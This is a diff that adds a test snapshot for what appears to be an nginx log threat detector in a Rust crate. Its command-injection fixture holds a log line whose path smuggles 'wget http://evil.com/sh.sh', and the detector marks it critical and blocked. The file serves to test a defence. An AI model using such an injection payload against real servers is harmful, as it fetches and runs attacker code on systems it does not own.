@@ -1,0 +1,16 @@
+---
+source: crates/sentry-source-nginx/tests/snapshots.rs
+expression: summary
+---
+fixture: cmd_injection
+line:    198.51.100.28 - - [10/Jan/2026:13:55:42 +0000] "GET /ping;wget%20http://evil.com/sh.sh HTTP/1.1" 200 8 "-" "curl/7.81.0"
+method:  Some(Get)
+path:    /ping;wget%20http://evil.com/sh.sh
+query:   -
+status:  200
+ua:      curl/7.81.0
+score:   100
+level:   CRIT
+verdict: Block
+rule:    -
+signals: [bad_crawler, rce, unknown_route]
